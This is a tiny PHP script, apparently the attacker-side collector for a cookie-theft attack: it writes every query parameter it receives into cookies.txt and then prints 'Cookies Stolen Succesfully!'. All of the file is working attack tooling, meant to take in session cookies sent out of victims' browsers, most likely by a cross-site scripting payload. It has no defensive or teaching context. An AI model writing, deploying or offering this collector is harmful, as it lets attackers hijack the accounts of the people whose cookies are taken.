<?php
$file = fopen("cookies.txt", "a+") or die("Unable to open file!");
foreach ($_GET as $key => $value) {
    fwrite($file, $key . ' : ' . $value . "\n");
}
fclose($file);
echo 'Cookies Stolen Succesfully!';
